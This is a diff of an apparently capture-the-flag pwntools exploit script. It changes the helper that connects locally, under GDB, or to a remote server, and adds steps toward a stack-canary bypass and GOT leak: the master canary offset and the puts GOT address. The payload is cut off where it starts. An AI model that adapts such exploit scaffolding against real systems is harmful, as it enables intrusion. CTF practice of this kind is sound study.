@@ -9,23 +9,23 @@ ld = ELF("./ld-2.31.so")
 context.binary = exe
 
 
-def conn():
-    if args.LOCAL:
-        r = process([exe.path])
-        if args.GDB:
-            gdb.attach(r)
-    else:
-        r = remote("addr", 1337)
-
-    return r
-
+def start(argv=[], *a, **kw):
+    if args.GDB: # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else: # Run locally
+        return process([exe] + argv, *a, **kw)
 
 def main():
-    r = conn()
+    r = start()
 
     buf_addr = 0x7ffff8dadec0
     master_canary_addr = 0x7ffff7dae728
     master_canary_addr_off = buf_addr - master_canary_addr
+
+    got_puts_addr = exe.got["puts"]
+    print(got_puts_addr)
 
 
     payload = flat(
